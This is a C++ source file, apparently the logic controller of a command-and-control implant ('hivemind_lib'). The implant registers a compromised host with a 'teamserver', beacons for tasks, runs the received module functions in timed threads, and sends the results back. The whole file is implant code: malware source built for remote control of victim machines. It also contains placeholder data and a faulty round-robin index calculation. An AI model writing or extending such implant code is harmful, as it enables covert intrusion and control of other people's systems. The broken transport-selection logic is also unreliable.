#include "logic_controller.hpp"

namespace hivemind_lib {
bool LogicController::running_ = true;
boost::mutex LogicController::thread_infos_lock_;
int current_transport = 0;

std::shared_ptr<Transport> LogicController::GetTransportToUse() {
  //TODO look at possibly disabling a transport if a callback fails, not here specifically but in general.
  if(this->transports_.size() == 1){
    return this->transports_[0];
  }
  switch(this->transport_selection_method_){
    case ROUND_ROBIN: {
      auto transport_to_return = this->transports_[current_transport];
      current_transport = (current_transport + 1) % this->transports_.size()-1;
      return transport_to_return;
    }
    case RANDOM: {
      std::random_device rd;
      std::mt19937 mt(rd());
      std::uniform_int_distribution<int> distribution(0,this->transports_.size()-1);
      int random_index = distribution(mt);
      return this->transports_[random_index];
    }
    case NONE: {
      this->SetError();
      DEBUG("No method given for selecting a transport", LEVEL_ERROR);
      return nullptr;
    }
  }
}

LogicController::LogicController() {
  signal(SIGINT, LogicController::SignalHandler);
  signal(SIGABRT, LogicController::SignalHandler);
  signal(SIGTERM, LogicController::SignalHandler);
}

void LogicController::RegisterBot() {
  if (this->transports_.empty()) {
    this->SetError();
    return;
  }
  struct RegistrationRequest registration_request;
  struct Packet packet;
// TODO Get this
  this->implant_info_ = {"", "192.168.7.1"};

  std::vector<ModuleInfo> values;

  for (const auto &kv : this->modules_) {
    values.push_back(kv.second->mod_info_);
  }

// TODO Get this stuff
  registration_request.hostname = "Meep";
  registration_request.MAC = "aa:ss:dd:ff:gg:hh";
  registration_request.implantVersion = "1337";
  registration_request.IP = this->implant_info_.primaryIP;
  registration_request.implantName = "Battle Paddle";
  registration_request.OS = "Windows trash";
  registration_request.supportedModules = values;
//******************

  nlohmann::json j = nlohmann::json(registration_request);

// TODO determine fingerprint
  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implant_info_;
  packet.numLeft = 0;
  packet.packetType = REGISTRATION_REQUEST_CODE;
  packet.data = j.dump();

  nlohmann::json p = nlohmann::json(packet);
  DEBUG(p.dump(), LEVEL_DEBUG);

  auto transport = this->GetTransportToUse();
  if(!transport){
    return;
  }

  auto response = transport->SendAndReceive(p.dump());
  DEBUG(response, LEVEL_DEBUG);
  try {
    nlohmann::json resp = nlohmann::json::parse(response);
    auto packet_resp = resp.get<std::vector<Packet>>();
    if (packet_resp[0].packetType == REGISTRATION_RESPONSE_CODE) {
      DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
      auto inner_data = nlohmann::json::parse(packet_resp[0].data);
      auto reg_resp = inner_data.get<RegistrationResponse>();
      this->implant_info_.UUID = reg_resp.UUID;
    } else if (packet_resp[0].packetType == ERROR_CODE) {
      DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
      auto inner_data = nlohmann::json::parse(packet_resp[0].data);
      auto reg_error = inner_data.get<Error>();
      DEBUG("Error with registration: " << reg_error.errorNum, LEVEL_ERROR);
      if (reg_error.errorNum == DUPLICATE_REGISTRATION) {
        DEBUG("Was previously registered, received UUID", LEVEL_DEBUG);
        this->implant_info_.UUID = packet_resp[0].implantInfo.UUID;
        return;
      }
      this->SetError();
      return;
    } else {
      DEBUG("Unexpected packet type: " << packet_resp[0].packetType, LEVEL_ERROR);
      this->SetError();
      return;
    }
  } catch (...) {
    DEBUG("Error in parsing registration packet", LEVEL_ERROR);
    this->SetError();
    return;
  }
  return;
}

void LogicController::ThreadHandlerFunc() {
  while (running_) {
    thread_infos_lock_.lock();
    DEBUG("Checking running threads", LEVEL_DEBUG);
    auto thread_info = std::begin(thread_infos_);
    while (thread_info != std::end(thread_infos_)) {
      if (!thread_info->thread.timed_join(0)) {
        DEBUG("Thread finished, joining to clean", LEVEL_INFO);
        thread_info->thread.join();
        thread_info = thread_infos_.erase(thread_info);
      } else if (thread_info->time_start + thread_info->timeout < std::time(nullptr)) {
        DEBUG("Thread exceeded timeout, terminating", LEVEL_INFO);
        thread_info->thread.interrupt();
        thread_info->thread.join();
        thread_info = thread_infos_.erase(thread_info);
      }
      if (thread_info != std::end(thread_infos_)) {
        ++thread_info;
      }
    }
    thread_infos_lock_.unlock();
    // TODO determine if this is a good time
    boost::this_thread::sleep_for(boost::chrono::milliseconds(1000));
  }

  thread_infos_lock_.lock();
  for (auto &t :  thread_infos_) {
    t.thread.interrupt();
    t.thread.join();
  }
  thread_infos_lock_.unlock();

  DEBUG("Exiting ThreadHandler", LEVEL_INFO);
}

void LogicController::FuncExecutor(const std::string &mod,
                                   const std::string &func,
                                   const std::string &data,
                                   const std::string &action_id) {
  struct ActionResponse action_response{};
  struct Packet packet;

  action_response.actionId = action_id;
  //TODO try catch
  action_response.response = this->modules_[mod]->func_map_[func](data);

  nlohmann::json r = nlohmann::json(action_response);

  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implant_info_;
  packet.numLeft = 0;
  packet.packetType = ACTION_RESPONSE_CODE;
  packet.data = r.dump();

  nlohmann::json p = nlohmann::json(packet);
  auto transport = this->GetTransportToUse();

  if(!transport){
    return;
  }

  transport->Send(p.dump());
}

void LogicController::CreateFuncExecutor(const std::string &mod,
                                         const std::string &func,
                                         const std::string &data,
                                         const std::string &action_id) {
  struct ThreadInfo thread_info{};
  thread_info.thread = boost::thread(&LogicController::FuncExecutor, this, mod, func, data, action_id);
  thread_info.time_start = std::time(nullptr);
  thread_info.timeout = this->modules_[mod]->timeout_map_[func];
  thread_infos_lock_.lock();
  this->thread_infos_.push_back(std::move(thread_info));
  thread_infos_lock_.unlock();
}

void LogicController::BeginComms() {
  if (this->implant_info_.UUID.empty()) {
    this->SetError();
    return;
  }
  auto thread_handler = boost::thread([this] { ThreadHandlerFunc(); });

  struct Packet packet;

  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implant_info_;
  packet.numLeft = 0;
  packet.packetType = ACTION_REQUEST;
  packet.data = "";

  nlohmann::json p = nlohmann::json(packet);
  DEBUG(p.dump(), LEVEL_DEBUG);
  while (LogicController::running_) {
    auto transport = this->GetTransportToUse();
    if(!transport){
      return;
    }
    auto response = transport->SendAndReceive(p.dump());
    DEBUG(response, LEVEL_DEBUG);
    if (response.length() == 0) {
      DEBUG("No connection to teamserver", LEVEL_ERROR);
      continue;
    }
    try {
      nlohmann::json resp = nlohmann::json::parse(response);
      auto packet_resps = resp.get<std::vector<Packet>>();
      DEBUG("PARSED PACKET", LEVEL_DEBUG);
      for (auto packet_resp : packet_resps) {
        DEBUG("Packet type received: " << packet_resp.packetType, LEVEL_DEBUG);
        if (packet_resp.packetType == ACTION_CODE) {
          DEBUG("Received an action", LEVEL_INFO);
          auto inner_data = nlohmann::json::parse(packet_resp.data);
          auto action = inner_data.get<Action>();
          CreateFuncExecutor(action.module, action.moduleFunc, action.arguments, action.actionId);
        } else if (packet_resp.packetType == ERROR_CODE) {
          auto inner_data = nlohmann::json::parse(packet_resp.data);
          auto reg_error = inner_data.get<Error>();
          DEBUG("Error with packet: " << reg_error.errorNum, LEVEL_ERROR);
        } else if (packet_resp.packetType == NO_ACTION) {
          DEBUG("No Actions", LEVEL_INFO);
        } else {
          DEBUG("Unexpected packet type: " << packet_resp.packetType, LEVEL_ERROR);
        }
      }
    } catch (...) {
      DEBUG("Error in parsing packet", LEVEL_ERROR);
    }
    // TODO make this adjustable
    boost::this_thread::sleep_for(boost::chrono::milliseconds(5000));
  }

  LogicController::running_ = false;
  thread_handler.join();
}

void LogicController::AddModule(const std::string &module) {
  if (module == "ALL") {
    for (const auto &c: ModuleFactory::GetClasses()) {
      std::shared_ptr<Module> temp = ModuleFactory::MakeUnique(c);
      this->modules_.insert({temp->mod_info_.module_name, std::move(temp)});
    }
  } else {
    std::shared_ptr<Module> temp = ModuleFactory::MakeUnique(module);
    if (!temp) {
      DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
      this->SetError();
      ModuleFactory::ShowClasses();
      return;
    }
    DEBUG("Adding " << temp->mod_info_.module_name << " Module", LEVEL_DEBUG);
    this->modules_.insert({temp->mod_info_.module_name, std::move(temp)});
  }
}

void LogicController::AddTransportMethod(const std::string &transport,
                                         const std::string &hostname,
                                         const std::string &port) {
  auto all_transports = TransportFactory::GetClasses();
  if (std::find(all_transports.begin(), all_transports.end(), transport) == all_transports.end()) {
    DEBUG("UNKNOWN TRANSPORT", LEVEL_ERROR);
    this->SetError();
    TransportFactory::ShowClasses();
    return;
  }
  std::shared_ptr<Transport> temp = TransportFactory::MakeUnique(transport, hostname, port);
  if (!temp) {
    DEBUG("ERROR MAKING TRANSPORT", LEVEL_ERROR);
    return;
  }
  DEBUG("Adding " << transport << " Transport", LEVEL_DEBUG);
  this->transports_.push_back(std::move(temp));
}

bool LogicController::HasError() const {
  return this->error_;
}

void LogicController::SetError() {
  this->error_ = true;
}

void LogicController::SignalHandler(int) {
  LogicController::running_ = false;
  DEBUG("Shutting down", LEVEL_INFO);
}

void LogicController::SetTransportSelectionMethod(TransportSelectionMethod transport_selection_method) {
  transport_selection_method_ = transport_selection_method;
}
}